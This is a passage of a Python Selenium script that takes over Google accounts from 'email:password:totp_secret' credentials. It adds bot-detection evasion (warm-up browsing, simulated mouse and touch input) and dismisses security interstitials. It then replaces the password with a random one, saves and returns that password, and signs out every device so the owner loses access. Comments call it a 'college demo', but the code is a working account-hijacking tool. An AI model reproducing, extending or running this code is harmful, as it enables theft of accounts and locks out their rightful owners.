              if (t.indexOf('chrome device') !== -1 || t.indexOf('chromebook') !== -1
                  || t.indexOf('chrome os') !== -1) return 'chrome_device';
              if (t.indexOf('chrome') !== -1 && t.indexOf('windows') === -1 && t.indexOf('linux') === -1
                  && t.indexOf('mac') === -1) return 'chrome_device';
              if (t.indexOf('mac') !== -1 || t.indexOf('macos') !== -1) return 'mac';
              return 'session';
            }
            function pushLink(L, seen, out) {
              try {
                var href = (L.href || '').split('#')[0];
                if (!href || seen[href]) return;
                if (!isDetailPath(new URL(href).pathname)) return;
                var block = L.closest('[role="listitem"], li, tr') || L.parentElement || L;
                var label = (block.innerText || L.innerText || '').trim();
                if (label.length > 220) label = (L.innerText || '').trim() || label.slice(0, 180);
                if (!rowStillSignedIn(label)) return;
                seen[href] = true;
                out.push({
                  href: href,
                  label: label.slice(0, 120),
                  kind: sessionKind(label),
                });
              } catch(e) {}
            }
            var seen = {};
            var out = [];
            var roots = [document.querySelector('[role="main"]'), document.body];
            for (var r = 0; r < roots.length; r++) {
              if (!roots[r]) continue;
              var links = roots[r].querySelectorAll('a[href*="device-activity"]');
              for (var i = 0; i < links.length; i++) pushLink(links[i], seen, out);
            }
            return out;
            """
        )
        return raw if isinstance(raw, list) else []

    def collect_active_device_sessions(*, thorough: bool = False) -> list[dict]:
        """Active signed-in rows on the current list page (no navigation)."""
        merged: dict[str, dict] = {}
        try:
            height = driver.execute_script(
                "return Math.max(document.body.scrollHeight, "
                "(document.querySelector('[role=main]')||{}).scrollHeight||0, 1200);"
            )
        except Exception:
            height = 1600
        step_size = 500 if thorough else 700
        steps = max(3 if thorough else 2, int(height // step_size) + 1)
        if not thorough:
            steps = min(steps, 4)
        pause = (120, 220) if not thorough else (220, 380)
        for step in range(steps + 1):
            y = min(step * step_size, height)
            try:
                driver.execute_script(
                    "window.scrollTo(0, arguments[0]);"
                    "var m=document.querySelector('[role=main]');"
                    "if(m&&m.scrollHeight>m.clientHeight)m.scrollTop=arguments[0];",
                    y,
                )
            except Exception:
                pass
            rand_sleep(*pause)
            for item in _gather_device_sessions_js():
                href = item.get("href") or ""
                if href:
                    merged[href] = item
        try:
            driver.execute_script("window.scrollTo(0, 0);")
        except Exception:
            pass
        out = list(merged.values())
        out.sort(
            key=lambda s: (
                _SESSION_KIND_ORDER.index(s.get("kind") or "session")
                if (s.get("kind") or "session") in _SESSION_KIND_ORDER
                else 99,
                s.get("label") or "",
            )
        )
        return out

    def open_device_session(session: dict) -> str:
        """Open device detail by clicking the list row (stay in same auth session)."""
        href = (session.get("href") or "").split("#")[0]
        label = session.get("label") or ""
        kind = session.get("kind") or detect_session_kind(label)
        if not href:
            return ""
        clicked = driver.execute_script(
            _DEVICE_JS_HELPERS
            + """
            var target = arguments[0];
            var links = Array.from(document.querySelectorAll('a[href*="device-activity"]'));
            for (var i = 0; i < links.length; i++) {
              var L = links[i];
              try {
                if ((L.href || '').split('#')[0] !== target) continue;
              } catch(e) { continue; }
              if (!__visible(L)) continue;
              __click(L);
              return true;
            }
            return false;
            """,
            href,
        )
        if not clicked:
            try:
                driver.get(href)
            except Exception:
                return ""
        return f"[{kind}] {label[:70]}"

    def click_sign_out_on_device_detail() -> str | None:
        """Detail page: click Sign out only (skip Find device)."""
        return driver.execute_script(
            _DEVICE_JS_HELPERS
            + """
            function isFindDevice(label) {
              var t = (label || '').toLowerCase();
              return t.indexOf('find device') !== -1 || t.indexOf('find your device') !== -1
                || t.indexOf('find lost') !== -1;
            }
            function walk(root) {
              var nodes = root.querySelectorAll('button, a, [role="button"], [role="link"]');
              for (var i = 0; i < nodes.length; i++) {
                var el = nodes[i];
                if (!__visible(el)) continue;
                var t = (el.innerText || el.textContent || '').trim();
                var tl = t.toLowerCase();
                if (!tl || isFindDevice(tl)) continue;
                if (tl === 'sign out' || tl === 'sign out device' || tl.indexOf('sign out\\n') === 0) {
                  __click(el);
                  return t.slice(0, 40);
                }
              }
              var kids = root.querySelectorAll('*');
              for (var k = 0; k < kids.length; k++) {
                if (kids[k].shadowRoot) {
                  var sub = walk(kids[k].shadowRoot);
                  if (sub) return sub;
                }
              }
              return null;
            }
            return walk(document);
            """
        )

    def sign_out_current_device_from_list() -> bool:
        """Last step: open this device → Sign out (same click/back flow)."""
        return_to_device_list()
        sessions = collect_active_device_sessions()
        if not sessions:
            return False
        opened = open_device_session(sessions[0])
        if not opened:
            return False
        rand_sleep(700, 1100)
        handle_totp_if_prompted("Current device detail TOTP", max_rounds=2, quick=True)
        label = click_sign_out_on_device_detail()
        if not label:
            return_to_device_list()
            return False
        log(f"{email} — current device sign-out: {label}")
        rand_sleep(350, 550)
        confirm_device_dialog()
        rand_sleep(250, 450)
        confirm_device_dialog()
        handle_totp_if_prompted("Current device confirm TOTP", max_rounds=2, quick=True)
        return_to_device_list()
        return True

    def _tap_sign_out_button(dialog_only: bool = False) -> str:
        """Trusted tap on Sign out. Dialog confirm is separate from the page button."""
        hit = driver.execute_script(
            """
            var dialogOnly = arguments[0] === true;
            function norm(raw) {
              return (raw || '').toLowerCase().replace(/\\s+/g, ' ').trim();
            }
            function ok(t) {
              if (!t || t.length > 24) return false;
              if (t.indexOf('find device') !== -1 || t.indexOf('signed out') !== -1) return false;
              return t === 'sign out' || t === 'sign out device';
            }
            function walk(root) {
              var best = null;
              var nodes = root.querySelectorAll(
                'button, a, [role="button"], [role="link"], [role="menuitem"], [jsaction], span, div');
              for (var i = 0; i < nodes.length; i++) {
                var node = nodes[i];
                var t = norm(node.innerText || node.textContent || '');
                if (!ok(t)) continue;
                var clickable = node.closest(
                  'button, a, [role="button"], [role="link"], [role="menuitem"], [jsaction]') || node;
                var r = clickable.getBoundingClientRect();
                if (r.width < 2 || r.height < 2) continue;
                if (!best || t.length < best.len) best = {el: clickable, len: t.length, t: t};
              }
              var kids = root.querySelectorAll('*');
              for (var k = 0; k < kids.length; k++) {
                if (!kids[k].shadowRoot) continue;
                var sub = walk(kids[k].shadowRoot);
                if (sub && (!best || sub.len < best.len)) best = sub;
              }
              return best;
            }
            var roots = [];
            if (dialogOnly) {
              roots = Array.from(document.querySelectorAll(
                '[role="dialog"], [role="alertdialog"], [aria-modal="true"]'));
              if (!roots.length) return null;
            } else {
              roots = [document];
            }
            var hit = null;
            for (var i = 0; i < roots.length; i++) {
              hit = walk(roots[i]);
              if (hit) break;
            }
            if (hit) { try { hit.el.scrollIntoView({block:'center'}); } catch (e) {} }
            return hit;
            """,
            dialog_only,
        )
        if not isinstance(hit, dict) or hit.get("el") is None:
            return ""
        if not _trusted_tap(hit["el"]):
            return ""
        return str(hit.get("t") or "sign out")

    def use_desktop_device_list() -> None:
        """Wide layout so every device row is on screen, not cut off by the phone viewport."""
        try:
            driver.execute_cdp_cmd("Emulation.clearDeviceMetricsOverride", {})
        except Exception:
            pass
        try:
            driver.execute_cdp_cmd("Emulation.setTouchEmulationEnabled", {"enabled": False})
        except Exception:
            pass
        try:
            driver.set_window_size(1440, 900)
        except Exception:
            pass
        try:
            driver.execute_cdp_cmd("Emulation.setDeviceMetricsOverride", {
                "width": 1440,
                "height": 900,
                "deviceScaleFactor": 1,
                "mobile": False,
                "screenWidth": 1440,
                "screenHeight": 900,
            })
            log(f"{email} — device list layout: desktop 1440x900")
        except Exception as exc:
            log(f"{email} — desktop layout warning: {exc}")

    def sign_out_via_profile_icon() -> bool:
        """Header profile photo → Sign out. This is the current browser session."""
        avatar = driver.execute_script(
            """
            function walk(root) {
              var nodes = root.querySelectorAll('a, button, [role="button"]');
              for (var i = 0; i < nodes.length; i++) {
                var el = nodes[i];
                var aria = ((el.getAttribute('aria-label') || '') + ' ' + (el.getAttribute('title') || '')).toLowerCase();
                var href = (el.getAttribute('href') || '').toLowerCase();
                if (aria.indexOf('google account') !== -1 || aria.indexOf('account menu') !== -1
                    || href.indexOf('signoutoptions') !== -1) {
                  var r = el.getBoundingClientRect();
                  if (r.width > 8 && r.height > 8) return el;
                }
              }
              var kids = root.querySelectorAll('*');
              for (var k = 0; k < kids.length; k++) {
                if (!kids[k].shadowRoot) continue;
                var sub = walk(kids[k].shadowRoot);
                if (sub) return sub;
              }
              return null;
            }
            return walk(document);
            """
        )
        if avatar is None or not _trusted_tap(avatar):
            log(f"{email} — profile icon not found")
            return False
        log(f"{email} — opened profile menu")
        time.sleep(1.2)
        if _tap_sign_out_button():
            log(f"{email} — profile menu: Sign out")
            return True
        frames = driver.find_elements(By.CSS_SELECTOR, "iframe")
        for frame in frames:
            try:
                driver.switch_to.frame(frame)
                if _tap_sign_out_button():
                    log(f"{email} — profile menu: Sign out")
                    driver.switch_to.default_content()
                    return True
            except Exception:
                pass
            try:
                driver.switch_to.default_content()
            except Exception:
                pass
        log(f"{email} — Sign out not in profile menu")
        return False

    def run_device_activity_signouts(new_pw: str) -> dict:
        """After demo password change: sign out every device, then this session → Open."""
        log(f"{email} — Device activity: sign out all sessions")
        use_desktop_device_list()
        try:
            driver.get(DEVICE_ACTIVITY_URL)
        except Exception as exc:
            shot = screenshot_b64()
            return {
                "status": "unknown",
                "reason": f"Could not open device activity: {type(exc).__name__}",
                "totpCode": totp_code,
                "newPassword": new_pw,
                "debugScreenshot": shot,
            }

        if not ensure_device_activity_list("Device activity landing"):
            shot = screenshot_b64()
            return {
                "status": "unknown",
                "reason": "Device activity list nahi khuli (re-auth / redirect)",
                "totpCode": totp_code,
                "newPassword": new_pw,
                "debugScreenshot": shot,
            }
        def list_devices_fast(*, full_scroll: bool = False) -> list[dict]:
            merged: dict[str, dict] = {}

            def absorb() -> None:
                for item in _gather_device_sessions_js():
                    href = item.get("href") or ""
                    if href:
                        merged[href] = item

            absorb()
            # Desktop page still virtual-scrolls. Walk the window and any inner list.
            try:
                heights = driver.execute_script(
                    """
                    var hs = [document.body.scrollHeight || 0];
                    var main = document.querySelector('[role=main]');
                    if (main) hs.push(main.scrollHeight || 0);
                    var divs = document.querySelectorAll('div');
                    for (var i = 0; i < divs.length; i++) {
                      var d = divs[i];
                      if (d.scrollHeight > d.clientHeight + 50 && d.clientHeight > 100)
                        hs.push(d.scrollHeight);
                    }
                    return Math.max.apply(null, hs.concat([900]));
                    """
                ) or 900
            except Exception:
                heights = 900
            steps = min(10 if full_scroll else 6, max(3, int(heights / 400) + 1))
            for step in range(steps):
                y = step * 350
                try:
                    driver.execute_script(
                        """
                        var y = arguments[0];
                        window.scrollTo(0, y);
                        var main = document.querySelector('[role=main]');
                        if (main) main.scrollTop = y;
                        var divs = document.querySelectorAll('div');
                        for (var i = 0; i < divs.length; i++) {
                          var d = divs[i];
                          if (d.scrollHeight > d.clientHeight + 50 && d.clientHeight > 100)
                            d.scrollTop = y;
                        }
                        """,
                        y,
                    )
                except Exception:
                    pass
                time.sleep(0.1)
                absorb()
            try:
                driver.execute_script("window.scrollTo(0, 0);")
            except Exception:
                pass
            def _current_session(label: str) -> int:
                t = (label or "").lower()
                if "this device" in t or "current session" in t or "your current" in t:
                    return 1
                return 0

            out = list(merged.values())
            out.sort(
                key=lambda s: (
                    _current_session(s.get("label") or ""),
                    _SESSION_KIND_ORDER.index(s.get("kind") or "session")
                    if (s.get("kind") or "session") in _SESSION_KIND_ORDER
                    else 99,
                    s.get("label") or "",
                )
            )
            return out

        def click_sign_out_ready() -> str | None:
            deadline = time.time() + 4.0
            while time.time() < deadline:
                label = _tap_sign_out_button()
                if label:
                    return label
                time.sleep(0.2)
            return None

        def device_key(href: str) -> str:
            marker = "/device-activity/id/"
            path = href.split("?")[0].split("#")[0]
            idx = path.find(marker)
            if idx == -1:
                return path
            return path[idx:].rstrip("/")

        def wait_auto_back_to_list() -> bool:
            """Confirm the Sign out dialog, then wait. Back() cancels an open dialog."""
            confirmed = False
            deadline = time.time() + 7.0
            while time.time() < deadline:
                if _device_url_kind() == "list":
                    return True
                if not confirmed:
                    label = _tap_sign_out_button(dialog_only=True)
                    if label:
                        confirmed = True
                        log(f"{email} — confirmed sign-out dialog")
                        time.sleep(0.5)
                        continue
                time.sleep(0.25)
            if _device_url_kind() == "detail" and not confirmed:
                try:
                    driver.back()
                except Exception:
                    pass
                time.sleep(0.4)
            return _device_url_kind() == "list"

        def row_shows_signed_out(href: str) -> bool:
            if not href or _device_url_kind() != "list":
                return False
            return bool(driver.execute_script(
                """
                var want = arguments[0];
                var links = document.querySelectorAll('a[href*="device-activity"]');
                for (var i = 0; i < links.length; i++) {
                  var href = (links[i].href || '').split('#')[0];
                  if (href !== want && href.indexOf(want) === -1) continue;
                  var block = links[i].closest('[role="listitem"], li, tr') || links[i].parentElement;
                  var t = ((block && block.innerText) || '').toLowerCase();
                  if (t.indexOf('signed out') !== -1) return true;
                }
                return false;
                """,
                href,
            ))

        done_hrefs: set[str] = set()
        attempts: dict[str, int] = {}
        signed_out_count = 0
        kinds_done: dict[str, int] = {}
        kinds_seen: set[str] = set()
        back_fails = 0

        # Android, then Chrome, then Linux, then Windows — every row, then account logout.
        for _round in range(24):
            if _device_url_kind() != "list":
                if wait_auto_back_to_list():
                    back_fails = 0
                elif ensure_device_activity_list("Back to device list"):
                    back_fails = 0
                else:
                    back_fails += 1
                    log(f"{email} — not back on device list ({back_fails}/2)")
                    if back_fails >= 2:
                        break
                    continue

            sessions = list_devices_fast(full_scroll=(_round == 0))
            for s in sessions:
                kinds_seen.add(s.get("kind") or "session")
            pending = [s for s in sessions if device_key(s.get("href") or "") not in done_hrefs]
            by_kind: dict[str, int] = {}
            for s in sessions:
                k = s.get("kind") or "session"
                by_kind[k] = by_kind.get(k, 0) + 1
            names = [((s.get("kind") or "?") + ":" + (s.get("label") or "").split("\n")[0][:28]) for s in sessions]
            log(
                f"{email} — sessions on page: {len(sessions)} still signed in, "
                f"{len(pending)} left, counts={by_kind}, rows={names}"
            )
            if not pending:
                log(f"{email} — every listed device signed out — account logout")
                break

            target = pending[0]
            href = target.get("href") or ""
            key = device_key(href)
            kind = target.get("kind") or "session"
            attempts[key] = attempts.get(key, 0) + 1
            device_label = open_device_session(target)
            if not device_label:
                if attempts[key] >= 2:
                    done_hrefs.add(key)
                continue
            log(f"{email} — opened device: {device_label[:80]}")
            try:
                labels = driver.execute_script(
                    """
                    var out = [];
                    function walk(root) {
                      var nodes = root.querySelectorAll('button, a, [role="button"]');
                      for (var i = 0; i < nodes.length; i++) {
                        var t = (nodes[i].innerText || '').replace(/\\s+/g, ' ').trim();
                        if (!t || t.length > 32) continue;
                        var r = nodes[i].getBoundingClientRect();
                        if (r.width < 2 || r.height < 2) continue;
                        if (out.indexOf(t) === -1) out.push(t);
                      }
                      var kids = root.querySelectorAll('*');
                      for (var k = 0; k < kids.length; k++) {
                        if (kids[k].shadowRoot) walk(kids[k].shadowRoot);
                      }
                    }
                    walk(document);
                    return out.slice(0, 10);
                    """
                )
                log(f"{email} — detail buttons: {labels}")
            except Exception:
                pass
            sign_out_label = click_sign_out_ready()
            if not sign_out_label:
                log(f"{email} — Sign out not found — next device")
                wait_auto_back_to_list()
                if attempts[key] >= 2:
                    done_hrefs.add(key)
                continue

            log(f"{email} — clicked Sign out [{kind}]")
            time.sleep(0.35)
            back_ok = wait_auto_back_to_list()
            if not back_ok and _device_url_kind() != "list":
                log(f"{email} — list par wapas nahi aaya, agla device")
                try:
                    driver.get(DEVICE_ACTIVITY_URL)
                    time.sleep(0.8)
                except Exception:
                    pass
            if row_shows_signed_out(href) or row_shows_signed_out(key):
                done_hrefs.add(key)
                signed_out_count += 1
                kinds_done[kind] = kinds_done.get(kind, 0) + 1
                log(f"{email} — device sign-out #{signed_out_count} [{kind}] list shows Signed out")
            else:
                log(f"{email} — [{kind}] abhi bhi signed in ({attempts[key]}/2)")
                if attempts[key] >= 2:
                    done_hrefs.add(key)
                    log(f"{email} — [{kind}] skip, next device")

        kinds_seen_sorted = sorted(kinds_seen)
        log(
            f"{email} — session types seen on device activity: {kinds_seen_sorted or ['none']}"
        )
        log(f"{email} — final logout via profile icon ({signed_out_count} other device(s) signed out)")
        if _device_url_kind() != "list":
            ensure_device_activity_list("Before profile sign-out")
        signed_self = False
        try:
            signed_self = sign_out_via_profile_icon()
            rand_sleep(400, 700)
        except Exception as exc:
            log(f"{email} — profile sign-out warning: {exc}")
        if not signed_self:
            log(f"{email} — profile menu missed, using logout URL")
            try:
                driver.get("https://accounts.google.com/Logout?continue=https://myaccount.google.com/")
                rand_sleep(400, 700)
            except Exception as _le:
                log(f"{email} — Logout URL warning: {_le}")

        handle_totp_if_prompted("Self sign-out TOTP", max_rounds=2, quick=True)
        shot = screenshot_b64()
        return {
            "status": "opened",
            "reason": (
                f"Demo password + saare devices signed out ✅ "
                f"({signed_out_count} sign-outs; types seen: "
                f"{', '.join(kinds_seen_sorted) or 'none'}; "
                f"signed out: {', '.join(f'{k}×{v}' for k, v in sorted(kinds_done.items())) or 'none'}; "
                f"naya password export — {len(new_pw)} chars)"
            ),
            "totpCode": totp_code,
            "newPassword": new_pw,
            "debugScreenshot": shot,
        }

    def complete_password_change_if_needed(current_url: str) -> dict | None:
        """College demo: fill random new password on myaccount signinoptions/password."""
        if not change_password_after_login or not is_google_password_change_url(current_url):
            return None

        new_pw = generate_random_password()
        log(
            f"{email} — Password-change page: demo mode, random password "
            f"({len(new_pw)} chars, a-z A-Z 0-9)"
        )
        try:
            os.makedirs("/tmp/vanguard-mx", exist_ok=True)
            _pw_path = "/tmp/vanguard-mx/last_new_password.json"
            with open(_pw_path, "w") as _pwf:
                json.dump({"email": email, "password": new_pw}, _pwf)
            os.chmod(_pw_path, 0o600)
        except Exception as _pe:
            log(f"{email} — could not store new password file: {_pe}")

        def fill_field(el, value: str) -> None:
            try:
                touch_click(driver, el)
                rand_sleep(80, 160)
                try:
                    el.clear()
                except Exception:
                    pass
                clipboard_type(driver, el, value)
            except Exception:
                driver.execute_script(
                    """
                    const el = arguments[0], val = arguments[1];
                    el.focus();
                    el.value = val;
                    el.dispatchEvent(new Event('input', { bubbles: true }));
                    el.dispatchEvent(new Event('change', { bubbles: true }));
                    """,
                    el,
                    value,
                )

        def click_password_form_continue() -> bool:
            """Primary form button — not the post-fill 'stay signed in' dialog."""
            return bool(driver.execute_script(
                """
                var labels = ['save password', 'save', 'next', 'continue', 'done', 'update'];
                var btns = Array.from(document.querySelectorAll('button, [role="button"], div[role="button"]'));
                for (var label of labels) {
                    var hit = btns.find(function(b) {
                        var t = (b.innerText || b.textContent || '').trim().toLowerCase();
                        return t === label || t.indexOf(label) === 0;
                    });
                    if (hit && !hit.disabled) { hit.click(); return true; }
                }
                var submit = document.querySelector('button[type="submit"]');
                if (submit && !submit.disabled) { submit.click(); return true; }
                return false;
                """
            ))

        def confirm_stay_signed_in_dialog() -> bool:
            """Dialog: 'You'll stay signed in on these devices after changing your password'."""
            return bool(driver.execute_script(
                """
                function walk(root) {
                  var btns = Array.from(root.querySelectorAll('button, [role="button"]'));
                  for (var b of btns) {
                    var t = (b.innerText || b.textContent || '').trim().toLowerCase();
                    if (t === 'change password' && !b.disabled) {
                      b.click();
                      return true;
                    }
                  }
                  for (var n of root.querySelectorAll('*')) {
                    if (n.shadowRoot && walk(n.shadowRoot)) return true;
                  }
                  return false;
                }
                var body = (document.body.innerText || '').toLowerCase();
                if (body.indexOf('stay signed in') === -1
                    && body.indexOf('changing your password') === -1
                    && body.indexOf('after changing your') === -1) {
                  return false;
                }
                return walk(document);
                """
            ))

        def submit_password_change_form() -> None:
            click_password_form_continue()
            rand_sleep(700, 1100)
            for _ in range(4):
                if confirm_stay_signed_in_dialog():
                    log(f"{email} — clicked 'Change password' on stay-signed-in dialog")
                    rand_sleep(2200, 3500)
                else:
                    break

        def wait_fields(timeout: float = 18.0) -> list:
            deadline = time.time() + timeout
            fields: list = []
            while time.time() < deadline:
                fields = collect_password_fields(driver)
                if fields:
                    return fields
                time.sleep(0.35)
            return fields

        try:
            rand_sleep(800, 1400)
            fields = wait_fields()
            log(f"{email} — password change: found {len(fields)} input(s) on page")

            if not fields:
                shot = screenshot_b64()
                return {
                    "status": "unknown",
                    "reason": "Password change page open but no password fields found (try again)",
                    "totpCode": totp_code,
                    "newPassword": new_pw,
                    "debugScreenshot": shot,
                }

            # Google may show current + new + confirm, or only new + confirm.
            if len(fields) >= 3:
                fill_field(fields[0], password)
                rand_sleep(120, 220)
                fill_field(fields[1], new_pw)
                rand_sleep(120, 220)
                fill_field(fields[2], new_pw)
            elif len(fields) >= 2:
                fill_field(fields[0], new_pw)
                rand_sleep(120, 220)
                fill_field(fields[1], new_pw)
            else:
                fill_field(fields[0], new_pw)

            rand_sleep(200, 400)
            try:
                fields[-1].send_keys(Keys.ENTER)
            except Exception:
                pass
            rand_sleep(400, 700)
            submit_password_change_form()
            rand_sleep(1500, 2500)
            clear_totp_pages(max_rounds=2, pause_label="After password change")

            url_after, text_after = page_state()
            if is_google_password_change_url(url_after):
                fields2 = wait_fields(10.0)
                log(f"{email} — password change retry: {len(fields2)} input(s)")
                if fields2:
                    if len(fields2) >= 3:
                        fill_field(fields2[0], password)
                        fill_field(fields2[1], new_pw)
                        fill_field(fields2[2], new_pw)
                    elif len(fields2) >= 2:
                        fill_field(fields2[0], password)
                        fill_field(fields2[1], new_pw)
                    else:
                        fill_field(fields2[0], new_pw)
                    rand_sleep(200, 400)
                    submit_password_change_form()
                    rand_sleep(1500, 2500)
                    clear_totp_pages(max_rounds=2, pause_label="After password change retry")
                    url_after, text_after = page_state()

            if is_google_password_change_url(url_after):
                for _dlg in range(4):
                    if confirm_stay_signed_in_dialog():
                        log(f"{email} — dialog confirm pass {_dlg + 1}")
                        rand_sleep(2200, 3500)
                        url_after, text_after = page_state()
                        if not is_google_password_change_url(url_after):
                            break
                    else:
                        break

            if not is_google_password_change_url(url_after):
                try:
                    driver.get(ACCOUNT_HOME)
                    rand_sleep(1500, 2500)
                    url_after, text_after = page_state()
                except Exception:
                    pass

            if is_google_password_change_url(url_after):
                shot = screenshot_b64()
                return {
                    "status": "unknown",
                    "reason": "Password change page still showing — check screenshot / try manually",
                    "totpCode": totp_code,
                    "newPassword": new_pw,
                    "debugScreenshot": shot,
                }

            # Password changed — do NOT return Open yet; sign out all devices first.
            log(f"{email} — Password change done — starting device activity sign-outs")
            return run_device_activity_signouts(new_pw)
        except Exception as exc:
            log(f"{email} — password change error: {exc}")
            shot = screenshot_b64()
            return {
                "status": "unknown",
                "reason": f"Password change failed: {type(exc).__name__}",
                "totpCode": totp_code,
                "newPassword": new_pw,
                "debugScreenshot": shot,
            }

    # A phone already has Google cookies and a little mouse history. A cold
    # profile that opens the sign-in form immediately is what makes the
    # checkbox escalate to a puzzle. One homepage load is enough; no search.
    try:
        log(f"{email} — Warmup: google.com")
        driver.get("https://www.google.com")
        _warm_deadline = time.time() + 8
        while time.time() < _warm_deadline:
            try:
                if driver.execute_script("return document.readyState") == "complete":
                    break
            except Exception:
                pass
            time.sleep(0.3)
        _xdt = _get_xdotool()
        _win = _get_chrome_win_id()
        if _xdt and _win:
            _denv = {**os.environ, "DISPLAY": os.environ.get("DISPLAY", ":99")}
            subprocess.run([_xdt, "windowfocus", "--sync", _win], capture_output=True, timeout=3, env=_denv)
            for _mv in range(3):
                subprocess.run(
                    [_xdt, "mousemove", "--window", _win, str(random.randint(40, 280)), str(random.randint(80, 360))],
                    capture_output=True, timeout=3, env=_denv,
                )
                time.sleep(random.uniform(0.15, 0.35))
        rand_sleep(600, 1100)
    except Exception as _warm_err:
        log(f"{email} — warmup skipped: {_warm_err}")

    log(f"{email} — Opening password-page sign-in link")
    try:
        driver.get(LOGIN_START)
        rand_sleep(600, 1000)
    except Exception as e:
        # Navigation failure = Chrome/ChromeDriver crashed — treat as retriable
        shot = None
        try: shot = screenshot_b64()
        except Exception: pass
        return {
            "status": "unknown",
            "reason": f"Chrome crash while opening accounts.google.com. ({type(e).__name__}: {str(e).splitlines()[0][:150]})",
            "totpCode": totp_code,
            "debugScreenshot": shot,
        }

    url, text = page_state()
    log(f"{email} — After nav: {url[:70]}")

    # Defined early so TOTP right after LOGIN_START is handled before email step.
    def finish_after_totp(start_label: str) -> dict | None:
        nonlocal url, text, totp_code
        if not totp_secret and not totp_code:
            shot = screenshot_b64()
            return {
                "status": "2fa_required",
                "reason": "2FA required — add TOTP secret as 3rd field: email:password:totp_secret",
                "totpCode": None,
                "debugScreenshot": shot,
            }
        if not enter_fresh_totp_once(start_label):
            shot = screenshot_b64()
            return {
                "status": "unknown",
                "reason": "TOTP page open but code could not be entered — check 2FA secret",
                "totpCode": totp_code,
                "debugScreenshot": shot,
            }
        clear_totp_pages(max_rounds=2, pause_label=f"{start_label} extra")
        rand_sleep(700, 1200)
        deadline = time.time() + 35
        while time.time() < deadline:
            url = driver.current_url
            if signed_in_host(url) or is_google_password_change_url(url):
                break
            if is_totp_challenge_url(url):
                enter_fresh_totp_once("TOTP while waiting")
                rand_sleep(700, 1200)
                continue
            if "signin/continue" in url:
                try:
                    driver.execute_script("""
                        var btn = document.querySelector('#confirm, button[type="submit"], button');
                        if (btn) btn.click();
                    """)
                except Exception:
                    pass
            time.sleep(0.45)
        url, text = page_state()
        _pc = complete_password_change_if_needed(url)
        if _pc:
            return _pc
        result = classify(url, text)
        if result:
            return result
        return None

    if is_totp_challenge_url(url):
        log(f"{email} — TOTP page right after sign-in link")
        _nav_totp = finish_after_totp("Post-nav TOTP")
        if _nav_totp:
            return _nav_totp

    if "signin/rejected" in url:
        shot = screenshot_b64()
        return {
            "status": "verification_required",
            "reason": "Google stopped on accounts.google.com: Couldn't sign you in. This browser or app may not be secure. Password and 2FA did not start.",
            "totpCode": totp_code,
            "debugScreenshot": shot,
        }

    # Already-authenticated session in persistent profile — skip straight to Gmail
    # Do NOT fall through to Steps 2-4 (no email field on these pages)
    if "signin/continue" in url or "accounts.google.com/o/oauth2/auth" in url:
        log(f"{email} — Session still active (signin/continue), opening Google Account")
        try:
            driver.get(ACCOUNT_HOME)
            rand_sleep(2500, 3500)
        except Exception:
            pass
        # Mini interstitial loop — dismiss recovery/uplevelingstep pages then land on Gmail
        _uplevel_hits = 0
        for _si in range(8):
            url, text = page_state()
            log(f"{email} — [shortcut loop {_si}] {url[:70]}")
            if signed_in_host(url):
                break
            result = classify(url, text)
            if result:
                return result
            _host = get_hostname(url)
            if "uplevelingstep" in url:
                _uplevel_hits += 1
                if _uplevel_hits == 1:
                    # Try "Not now" / "Skip" on any element including plain <a>
                    try:
                        driver.execute_script("""
                            var skip_texts=['not now','skip','later','no thanks','dismiss','cancel'];
                            var els=Array.from(document.querySelectorAll('button,a,[role="button"],[role="link"]'));
                            for(var t of skip_texts){
                                var f=els.find(b=>b.innerText&&b.innerText.trim().toLowerCase()===t);
                                if(f){f.click();return;}
                            }
                            // partial match
                            for(var t of skip_texts){
                                var f=els.find(b=>b.innerText&&b.innerText.trim().toLowerCase().indexOf(t)===0);
                                if(f){f.click();return;}
                            }
                        """)
                    except Exception:
                        pass
                elif _uplevel_hits == 2:
                    # Try Gmail HTML version
                    try:
                        driver.get(ACCOUNT_HOME)
                        rand_sleep(2000, 3000)
                        _hu = driver.current_url
                        if signed_in_host(_hu) and "uplevelingstep" not in _hu:
                            break  # HTML Gmail loaded — continue to classify below
                    except Exception:
                        pass
                else:
                    # uplevelingstep persists after multiple dismiss attempts →
                    # mandatory phone/QR verification that cannot be bypassed automatically
                    log(f"{email} — shortcut: uplevelingstep persists → verification_required")
                    shot = screenshot_b64()
                    return {
                        "status": "verification_required",
                        "reason": "Google requires phone or device verification to continue (cannot bypass automatically)",
                        "totpCode": totp_code,
                        "debugScreenshot": shot,
                    }
            elif "gds.google.com" in _host:
                try:
                    driver.execute_script("""
                        var skip_texts=['not now','skip','later','no thanks','dismiss','cancel'];
                        var btns=Array.from(document.querySelectorAll('button,a[role="button"]'));
                        for(var t of skip_texts){
                            var f=btns.find(b=>b.innerText&&b.innerText.trim().toLowerCase()===t);
                            if(f){f.click();return;}
                        }
                        if(btns.length>=2)btns[btns.length-2].click();
                    """)
                except Exception:
                    pass
            elif "signin/continue" in url:
                try:
                    driver.get("https://myaccount.google.com/")
                except Exception:
                    pass
            else:
                try:
                    driver.execute_script("""
                        var btn=document.querySelector('button[type="submit"],#confirm,button');
                        if(btn)btn.click();
                    """)
                except Exception:
                    pass
            rand_sleep(2000, 3000)
        url, text = page_state()
        result = classify(url, text)
        if result:
            return result
        shot = screenshot_b64()
        return {
            "status": "unknown",
            "reason": f"Session active but Gmail not reached after interstitials: {url[:80]}",
            "totpCode": totp_code,
            "debugScreenshot": shot,
        }

    result = classify(url, text)
    if result:
        return result

    url, text = page_state()
    if is_totp_challenge_url(url):
        log(f"{email} — TOTP page before email step — entering code")
        early_totp = finish_after_totp("Early TOTP page")
        if early_totp:
            return early_totp

    EMAIL_SELECTORS = [
        "#identifierId",
        'input[type="email"]',
        'input[name="identifier"]',
        'input[autocomplete="username"]',
        'input[name="Email"]',
    ]

    # ── Step 2: Enter email ───────────────────────────────────────────────────
    log(f"{email} — Step 2: typing email")
    email_field = wait_for_any(EMAIL_SELECTORS, timeout=8)

    if not email_field:
        url, text = page_state()
        if is_totp_challenge_url(url):
            log(f"{email} — Email step skipped — on TOTP page")
            totp_result = finish_after_totp("TOTP instead of email")
            if totp_result:
                return totp_result
        result = classify(url, text)
        if result:
            return result
        shot = screenshot_b64()
        return {
            "status": "unknown",
            "reason": f"Email field not found. URL: {url[:80]}",
            "totpCode": totp_code,
            "debugScreenshot": shot,
        }

    # click with stale-element retry (proxy extension can cause brief page reload)
    for _attempt in range(3):
        try:
            touch_click(driver, email_field)   # TouchEvent — real phone fires touch not mouse
            break
        except Exception:
            rand_sleep(200, 400)
            email_field = wait_for_any(EMAIL_SELECTORS, timeout=6) or email_field

    rand_sleep(80, 160)
